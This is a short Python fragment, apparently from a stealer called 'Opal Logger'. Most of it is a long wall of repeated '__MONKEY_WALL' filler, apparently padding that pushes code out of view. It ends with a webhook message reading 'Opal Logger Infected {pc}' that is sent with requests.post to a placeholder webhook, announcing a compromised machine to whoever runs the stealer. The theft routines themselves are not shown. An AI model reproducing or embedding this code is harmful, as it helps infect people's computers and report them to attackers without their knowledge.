NKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL'
__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL='__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL'

lmaooo = {
            "embeds": [
                {
                    "author": {
                        "name": "Opal Logger",
                    },
                    "description": f"Opal Logger Infected {pc}",
                    "color": 0x00C7FF,
                    
                    "footer": {
                      "text": "Opal Logger | https://github.com/syntheticc/Opal-Logger"
                    }
                }
            ]
        }
requests.post("webhooker", json=lmaooo)
